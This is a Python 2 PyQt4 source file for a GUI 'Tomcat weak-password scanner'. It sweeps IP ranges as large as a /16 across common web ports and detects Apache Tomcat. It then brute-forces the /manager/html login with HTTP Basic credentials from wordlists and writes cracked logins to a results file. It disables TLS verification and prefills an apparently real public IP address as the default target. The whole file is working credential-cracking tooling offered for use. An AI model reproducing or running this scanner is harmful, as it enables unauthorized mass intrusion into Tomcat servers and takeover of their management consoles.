#!/usr/bin/env python
#coding:utf-8

"""
@software: 醉考拉_tomcat弱口令扫描器 v1.0
@author: magicming
@site: https://github.com/magicming200
@time: 2017/1/11 22:02
"""

import sys
import socket
import struct
import ssl
import Queue
import time
import urllib2
import base64
import threading
from PyQt4 import QtGui,QtCore

gQueue=Queue.Queue()
gLock=threading.Lock()
#
gIpList=[]
gPortList=[]
gThreadAmount=100
gTimeout=8
#
gUserList=[]
gPassList=['']
#
gTagSCAN='scan-port'
gTagCHECK='check-app'
gTagCRACKSTART='crack-pass-start'
gTagCRACKOK='crack-pass-ok'

try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context

class WindowGui(QtGui.QWidget):
    def __init__(self):
        super(WindowGui, self).__init__()
        self.pool = QtCore.QThreadPool()
        self.pool.setMaxThreadCount(1000)
        self.initUI()

    def initUI(self):
        global gThreadAmount
        global gTimeout

        palette = QtGui.QPalette()
        palette.setColor(QtGui.QPalette.WindowText, QtCore.Qt.gray)

        lblIp = QtGui.QLabel(u'IP:')
        self.edtIp = QtGui.QLineEdit()
        self.edtIp.setText('101.200.204.61')
        self.lblIpTip = QtGui.QLabel(u'IP格式：192.168  192.168.1  192.168.1.1  192.168.1.1-192.168.5.100  ip.txt')
        self.lblIpTip.setPalette(palette)
        lblPort = QtGui.QLabel(u'端口:')
        self.edtPort = QtGui.QLineEdit()
        self.edtPort.setText(u'80,81,7001,7002,8080,8081,8088,8089,8090,8443,8888,9080,9090')
        self.lblPortTip = QtGui.QLabel(u'端口格式：80    80,8080,8090    port.txt')
        self.lblPortTip.setPalette(palette)
        lblThread = QtGui.QLabel(u'线程数量:')
        self.edtThread = QtGui.QLineEdit()
        self.edtThread.setText(str(gThreadAmount))
        lblTimeout = QtGui.QLabel(u'超时时间(秒):')
        self.edtTimeout = QtGui.QLineEdit()
        self.edtTimeout.setText(str(gTimeout))
        self.btnStart = QtGui.QPushButton(u"开始扫描")
        self.btnStart.setFont(QtGui.QFont('Timers', 12 ))
        self.lblBlank = QtGui.QLabel(u'')
        lblLog = QtGui.QLabel(u'扫描进度:')
        self.edtLog = QtGui.QTextEdit()
        lblResult = QtGui.QLabel(u'扫描结果:')
        self.edtResult = QtGui.QTextEdit()

        grid = QtGui.QGridLayout()
        grid.setSpacing(10)

        grid.addWidget(lblIp, 1, 0)
        grid.addWidget(self.edtIp, 1, 1)
        grid.addWidget(self.lblIpTip, 2, 1)
        grid.addWidget(lblPort, 3, 0)
        grid.addWidget(self.edtPort, 3, 1)
        grid.addWidget(self.lblPortTip, 4, 1)
        grid.addWidget(lblThread, 5, 0)
        grid.addWidget(self.edtThread, 5, 1)
        grid.addWidget(lblTimeout, 6, 0)
        grid.addWidget(self.edtTimeout, 6, 1)
        grid.addWidget(self.btnStart, 7, 1)
        grid.addWidget(self.lblBlank, 8, 0)
        grid.addWidget(lblLog, 9, 0)
        grid.addWidget(self.edtLog, 9, 1)
        grid.addWidget(lblResult, 10, 0)
        grid.addWidget(self.edtResult, 10, 1)

        self.btnStart.clicked.connect(self.btnStartClicked)

        self.setLayout(grid)
        self.resize(550,500)
        qr = self.frameGeometry()#居中
        cp = QtGui.QDesktopWidget().availableGeometry().center()
        qr.moveCenter(cp)
        self.move(qr.topLeft())
        self.setWindowTitle(u'醉考拉_Tomcat弱口令扫描器 v1.0        作者:magicming')
        self.show()

    def btnStartClicked(self):
        global gQueue
        global gTagSCAN
        global gIpList
        global gPortList
        global gThreadAmount
        global gTimeout

        ip=str(self.edtIp.text())
        port=str(self.edtPort.text())
        mnum=str(self.edtThread.text()).strip()
        timeout=str(self.edtTimeout.text()).strip()

        if len(ip)==0:
            self.msgbox(QtCore.QString(u'ip不能为空'))
        elif len(port)==0:
            self.msgbox(QtCore.QString(u'端口不能为空'))
        elif len(mnum) == 0:
            self.msgbox(QtCore.QString(u'线程数量必须为1~10000之间的整数'))
        elif not str.isdigit(mnum):
            self.msgbox(QtCore.QString(u'线程数量必须为1~10000之间的整数'))
        elif int(mnum)<=0:
            self.msgbox(QtCore.QString(u'线程数量必须为1~10000之间的整数'))
        elif int(mnum)>10000:
            self.msgbox(QtCore.QString(u'线程数量必须为1~10000之间的整数'))
        elif len(timeout) == 0:
            self.msgbox(QtCore.QString(u'超时必须为1~10000之间的整数'))
        elif not str.isdigit(timeout):
            self.msgbox(QtCore.QString(u'超时必须为1~10000之间的整数'))
        elif int(timeout)<=0:
            self.msgbox(QtCore.QString(u'超时必须为1~10000之间的整数'))
        elif int(timeout)>100:
            self.msgbox(QtCore.QString(u'超时必须为1~100之间的整数'))
        else:
            self.btnStart.setDisabled(True)
            self.btnStart.setText(u'扫描中...')
            self.edtLog.setText('')
            self.edtResult.setText('')
            gIpList=getIpList(ip)
            gPortList=getPortList(port)
            gThreadAmount=int(mnum)
            gTimeout=int(timeout)
            getUserAndPass()
            putInQueue(gTagSCAN, gIpList, gPortList)
            #执行管理线程
            manager = ManagerThread(self)
            manager.setDaemon(True)
            manager.signal.signalLog.connect(self.threadLog)
            manager.signal.signalManagerFinish.connect(self.threadFinish)
            manager.signal.signalBtnText.connect(self.btnStartScaning)
            manager.signal.signalBtnEnable.connect(self.btnStartEnble)
            manager.start()


    def threadLog(self, msg):#工作线程输出实时日志
        self.edtLog.setText(self.edtLog.toPlainText()+msg+'\n')
        self.edtLog.moveCursor(QtGui.QTextCursor.End)

    def threadResult(self, msg):#工作线程获取到密码
        self.edtResult.setText(self.edtResult.toPlainText()+msg+'\n')
        self.edtResult.moveCursor(QtGui.QTextCursor.End)

    def threadFinish(self, msg):#管理线程结束
        self.edtResult.setText(self.edtResult.toPlainText()+msg+'\n')
        self.edtResult.moveCursor(QtGui.QTextCursor.End)

    def btnStartScaning(self, msg):
        self.btnStart.setText(msg)

    def btnStartEnble(self, msg):
        self.btnStart.setText(u'开始扫描')
        self.btnStart.setEnabled(True)

    def msgbox(self,msg,title=u'标题'):
        QtGui.QMessageBox.information(self, title, msg)

class ManagerThread(threading.Thread):
    def __init__(self,uiself):
        super(ManagerThread, self).__init__()
        self.uiSelf=uiself
        self.signal=WorkerSignal()

    def run(self):
        global gThreadAmount
        global gQueue
        #开启worker线程
        for i in range(gThreadAmount):
            worker = WorkerThread(str(i))
            worker.setDaemon(True)
            worker.signal.signalLog.connect(self.uiSelf.threadLog)
            worker.signal.signalResult.connect(self.uiSelf.threadResult)
            worker.start()

        #循环监听，防止僵尸线程不结束
        tmp_count = 0
        max_wait_time=60
        i = 0
        t=0
        while True:
            #print 'while active thread:', threading.activeCount()
            t+=1
            dot=['|','/','-','\\','|','/','-','\\']
            scaning=u'扫描中...'+dot[t%8]
            self.signal.signalBtnText.emit(scaning)
            time.sleep(1)

            now_count = threading.activeCount()
            if now_count < gThreadAmount+2 and now_count == tmp_count:#+2是ui线程和manager线程
                i += 1
            else:
                i = 0
            tmp_count = now_count
            if threading.activeCount() <= 2 or i > max_wait_time:
                break
        #print 'manager thread end! now active: %d'%threading.activeCount()
        self.signal.signalLog.emit(u'----扫描结束!----')
        self.signal.signalManagerFinish.emit(u'----扫描结束!----')
        self.signal.signalBtnEnable.emit('enable')

class WorkerSignal(QtCore.QObject):
    signalLog=QtCore.pyqtSignal(basestring)
    signalResult=QtCore.pyqtSignal(basestring)
    signalManagerFinish=QtCore.pyqtSignal(basestring)
    signalBtnText=QtCore.pyqtSignal(basestring)
    signalBtnEnable=QtCore.pyqtSignal(basestring)

class WorkerThread(threading.Thread):
    def __init__(self,name):
        super(WorkerThread, self).__init__()
        self.name=name
        self.signal=WorkerSignal()

    def run(self):
        global gQueue
        global gTagSCAN
        global gTagCHECK
        global gTagCRACKSTART
        while True:
            try:
                if not gQueue.empty():
                    task=gQueue.get()
                else:
                    break
            except:
                break
            try:
                taskType,taskHost,taskPort=task.split(':')

                if taskType==gTagSCAN:#扫描开放端口
                    portFlag = scanPort(taskHost,taskPort)
                    if portFlag==True:
                        log=generateLog(gTagSCAN,taskHost,taskPort)
                        self.signal.signalLog.emit(log)
                        gQueue.put(":".join([gTagCHECK,taskHost,taskPort]))

                elif taskType==gTagCHECK:#识别应用是否为tomcat
                    checkFlag = checkApp(taskHost,taskPort)
                    if checkFlag==True:
                        log=generateLog(gTagCHECK,taskHost,taskPort)
                        self.signal.signalLog.emit(log)
                        gQueue.put(':'.join([gTagCRACKSTART,taskHost,taskPort]))

                elif taskType==gTagCRACKSTART:#破解密码
                    log = generateLog(gTagCRACKSTART, taskHost, taskPort)
                    self.signal.signalLog.emit(log)
                    flag=crackPassword(taskHost,taskPort)
                    result=flag.split('|')
                    if result[0]==u'YES':
                        log = generateLog(gTagCRACKOK, taskHost, taskPort,result[1])
                        savePasword(log)
                        self.signal.signalResult.emit(log)
            except:
               continue


def ipToNum(ip):
    packedIP = socket.inet_aton(ip)
    return struct.unpack("!L", packedIP)[0]

def numToIp(num):
    return socket.inet_ntoa(struct.pack('!L', num))


def getIpList(ip):
    errMsg='ip format is wrong'
    ipList=[]
    if '.txt' in ip:#ip文件 ip.txt
        try:
            ipFile=open(ip,'r')
            for ipf in ipFile:
                ipList.append(ipf.strip())
            ipFile.close()
        except Exception,e:
            print e
    elif '-' in ip:#ip段 192.168.1.1-192.168.10.200
        ipRange = ip.split('-')
        ipStart = long(ipToNum(ipRange[0]))
        ipEnd = long(ipToNum(ipRange[1]))
        ipCount = ipEnd - ipStart
        if ipCount >= 0 and ipCount <= 65536:
            for ipNum in range(ipStart,ipEnd+1):
                ipList.append(numToIp(ipNum))
        else:
            print errMsg
    else:#ip 192.168  192.168.1  192.168.1.1
        ipSplit=ip.split('.')
        section=len(ipSplit)
        if section==2:
            for c in range(1,255):
                for d in range(1,255):
                    ip='%s.%s.%d.%d'%(ipSplit[0],ipSplit[1],c,d)
                    ipList.append(ip)
        elif section==3:
            for d in range(1,255):
                ip='%s.%s.%s.%d'%(ipSplit[0],ipSplit[1],ipSplit[2],d)
                ipList.append(ip)
        elif section==4:
            ipList.append(ip)
        else:
            print errMsg
    return ipList


def getPortList(port):
    portList=[]
    filename='port.txt'
    if len(port)==0 or '.txt' in port:
        if '.txt' in port:filename=port
        try:
            file = open(filename,'r')
            for p in file:
                portList.append(p.strip())
            file.close()
        except Exception,e:
            print e
    else:
        portList=port.split(',')
    return portList

def getUserAndPass():
    global gUserList
    global gPassList
    gUserList=[]
    ufile=open('username.txt','r')
    for user in ufile:
        gUserList.append(user.strip())
    ufile.close()
    gPassList=['']
    pfile=open('password.txt','r')
    for p in pfile:
        gPassList.append(p.strip())
    pfile.close()

def putInQueue(taskType,ipList,portList):
    global gQueue
    while not gQueue.empty():#首先清空队列
        gQueue.get()
    for ip in ipList:#然后向队列放任务
        for port in portList:
            target=':'.join([taskType,ip,port])
            gQueue.put(target)

def scanPort(host,port):
    global gTimeout
    try:
        socket.setdefaulttimeout(gTimeout/2)
        mysock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        mysock.connect((str(host),int(port)))
        mysock.close()
        return True
    except:
        return False

def checkApp(host,port):
    global gTimeout
    mark_info=['tomcat','is_test','Apache Tomcat']
    try:
        re_html = urllib2.urlopen("http://%s:%d/%s"%(host,int(port),mark_info[1]),timeout=gTimeout).read()
    except urllib2.HTTPError,e:
        re_html = e.read()
    except Exception,e:
        return False
    if mark_info[2].lower() in re_html.lower():
        return True
    else:
        return False

def crackPassword(host,port):
    global gTimeout
    global gCRACKOK
    global gUserList
    global gPassList
    url = "http://%s:%d"%(host,int(port))
    error_i=0
    flag_list=['Application Manager','Welcome']
    user_list=gUserList
    pass_list=gPassList
    for user in user_list:
        for password in pass_list:
            try:
                login_url = url+'/manager/html'
                request = urllib2.Request(login_url)
                auth_str_temp=user+':'+password
                auth_str=base64.b64encode(auth_str_temp)
                request.add_header('Authorization', 'Basic '+auth_str)
                res = urllib2.urlopen(request,timeout=gTimeout)
                res_code = res.code
                res_html = res.read()
            except urllib2.HTTPError,e:
                res_code = e.code
                res_html = e.read()
            except urllib2.URLError,e:
                error_i+=1
                if error_i >= 3:
                    return 'NO'
                continue
            if int(res_code) == 404:
                return 'NO'
            if int(res_code) == 401 or int(res_code) == 403:
                continue
            for flag in flag_list:
                if flag in res_html:
                    info = u'%s弱口令是%s:%s'%(login_url,user,password)
                    info = u'YES|'+info
                    return info
    return 'NO'

def generateLog(scanType,host,port,crackResult=''):
    global gTagSCAN
    global gTagCHECK
    global gTagCRACKSTART
    global gTagCRACKOK

    timeStr=time.strftime('%X',time.localtime(time.time()))
    if scanType==gTagSCAN:
        return u'[%s]: %s开放%d端口'%(timeStr,host,int(port))
    elif scanType==gTagCHECK:
        return u'[%s]: http://%s:%d是tomcat'%(timeStr,host,int(port))
    elif scanType==gTagCRACKSTART:
        return u'[%s]: 开始破解http://%s:%d口令'%(timeStr,host,int(port))
    elif scanType==gTagCRACKOK:
        return u'[%s]: %s'%(timeStr,crackResult)

def savePasword(msg):
    global gLock
    gLock.acquire()
    try:
        file = open('result.txt', 'a')
        file.write(msg.encode('utf-8')+'\n')
        file.close()
    except Exception,e:
        print e
    gLock.release()

def main():
    app = QtGui.QApplication(sys.argv)
    ex = WindowGui()
    sys.exit(app.exec_())


if __name__ == '__main__':
    main()